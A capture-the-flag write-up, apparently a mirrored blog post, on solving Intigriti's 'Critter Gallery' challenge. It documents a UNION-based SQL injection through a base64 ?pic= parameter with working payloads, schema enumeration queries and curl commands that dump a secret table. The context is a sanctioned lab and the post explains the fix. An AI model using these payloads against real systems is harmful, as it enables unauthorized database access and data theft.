# ️‍♂️ How a Base64 ?pic=

- **Source URL:** https://medium.com/@laftman/%EF%B8%8F-%EF%B8%8F-how-a-base64-pic-225ebb0eba67
- **Fetched from:** https://medium.com/@laftman/%EF%B8%8F-%EF%B8%8F-how-a-base64-pic-225ebb0eba67?source=rss-7cd33463fbac------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14930 (id 14930)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** ⛧ Ⱡ₳₣₮M₳₦⛧ / Thu, 01 Oct 2026 17:10:52 GMT

**TL;DR:** The ?pic= parameter of the "Critter Gallery" challenge base64-decodes the input straight into a SQL query. Odd numbers of quotes kill the page, even numbers render it — classic string injection. A single-column UNION SELECT is reflected in the .desc element, so I enumerated critter\_gallery → secret\_vault(id, note) and extracted the flag: INTIGRITI{01a09f56…} 🚩

Intigriti’s September 2026 monthly CTF (“Challenge 0926”, by khanhdlq) presents a cute little “Critter Gallery”:

https://challenge-0926.challenges.intigriti.io/challenge.php

Eight tiles, each linking to ?pic=\<base64> — e.g. ?pic=Zm94 (fox), ?pic=cGFuZGE= (panda). Clicking a tile renders a detail card with an emoji, a name (h2), and a description (.desc).

**Rules:** exploit a vulnerability on the challenge page (no self-XSS, no MitM), submit the flag in INTIGRITI{.\*} format plus payloads and steps.

First thing I did was decode the links.

?pic= decodes to Zm94 fox cGFuZGE= panda bGlvbg== lion

So the app takes base64, decodes it, and looks something up. My hypotheses before sending a single payload:

I base64-encoded a'b (one quote) and a''b (two quotes):

a'b   -> YSdi

a''b -> YScnYg==

**Result:**

Odd quotes kill the page, even quotes render it. Same with fox' (Zm94Jw== → empty) vs fox'' (Zm94Jyc= → normal). That's the unmistakable signature of string-based SQL injection: the decoded input is interpolated into the query, and an unbalanced ' breaks the syntax.

*💡* ***XSS note:*** *h2 escapes everything — \<svg onload=alert(1)> came back as <svg onload=alert(1)>. More on the XSS negative result below.*

Next I sent the classic boolean payload (decoded: ' OR 1=1 --, b64 JyBPUiAxPTEtLSAt):

The .desc element suddenly contained all 8 critter descriptions concatenated:

\<div class="desc">The red fox is a clever, highly adaptable hunter.\<br>Giant pandas spend most of the day munching bamboo.\<br>Lions are the only truly social of the big cats.\<br>…\<br>\</div>

The query fetches rows in a loop and prints them all — full control over the WHERE clause confirmed. Similarly, fox' -- (commenting out the trailing quote) returned exactly the fox row.

UNION probing (all base64-encoded):

' UNION SELECT 1 --        -> works, .desc shows "1"

' UNION SELECT 1,2 -- -> SIZE 0 (SQL error)

' UNION SELECT 1,2,3 -- -> SIZE 0 (SQL error)

One column, reflected raw-ish in .desc. That's all I needed for exfiltration. 🎯

' UNION SELECT @@version --     -> 8.0.46

' UNION SELECT database() -- -> critter\_gallery

' UNION SELECT user() -- -> gallery@10.18.49.50

Tables in critter\_gallery:

' UNION SELECT group\_concat(table\_name)

FROM information\_schema.tables

WHERE table\_schema=database() --

→ animals, **secret\_vault**

Columns (using hex literals to dodge any quote filtering):

table 0x7365637265745f7661756c74 (secret\_vault) -> id, note

table 0x616e696d616c73 (animals) -> id, name, description

A table literally called secret\_vault with a note column. You know what to do. 😏

' UNION SELECT group\_concat(id,0x3a,note) FROM secret\_vault --

Base64:

JyBVTklPTiBTRUxFQ1QgZ3JvdXBfY29uY2F0KGlkLDB4M2Esbm90ZSkgRlJPTSBzZWNyZXRfdmF1bHQtLSAt

**Response:**

`<div class="desc">1:INTIGRITI{01a09f56–74a2–700b-a849-ffe6742327b2}<br></div>`
Reproduced 3× with fresh requests — same flag every time. 🔁 (For completeness, I also dumped animals: 8 rows, 1:fox:The red fox… etc., matching the gallery.)

Since the rules exclude self-XSS, I checked whether the injection could be escalated to XSS against other visitors. Answer: **no**. Both sinks are HTML-escaped:

Output encoding holds; the intended chain is pure SQLi → data extraction.

Single-column UNION-based SQL injection, unauthenticated, over GET:

\# 1. SQLi litmus: odd quotes = empty page, even quotes = normal page

curl -s -o /dev/null -w '%{size\_download}\n' \

'https://challenge-0926.challenges.intigriti.io/challenge.php?pic=YSdi' # a'b -> 0

```
curl -s -o /dev/null -w '%{size_download}\n' \
  'https://challenge-0926.challenges.intigriti.io/challenge.php?pic=YScnYg==' # a''b -> ~4089
```
\# 2. Dump all rows

curl -s '…/challenge.php?pic=JyBPUiAxPTEtLSAt' | grep '\<div class="desc'

\# 3. Flag

curl -s '…/challenge.php?pic=JyBVTklPTiBTRUxFQ1QgZ3JvdXBfY29uY2F0KGlkLDB4M2Esbm90ZSkgRlJPTSBzZWNyZXRfdmF1bHQtLSAt' \

| grep -o 'INTIGRITI{\[^}\]\*}'

The app did two things that, combined, are fatal: it decoded an opaque-looking parameter (base64 gives a false sense of “not user input”) and concatenated the result into SQL. The fix is boring and that’s the point — bound parameters, allowlists, generic errors. The gallery stays cute, and the vault stays shut. 🔒

🏆 Solved on **09/21/2026**, submitted as INTIGRITI-JBV4CQ4T **(Accepted ✅)**. Thanks to khanhdlq and the Intigriti team for the fun challenge!
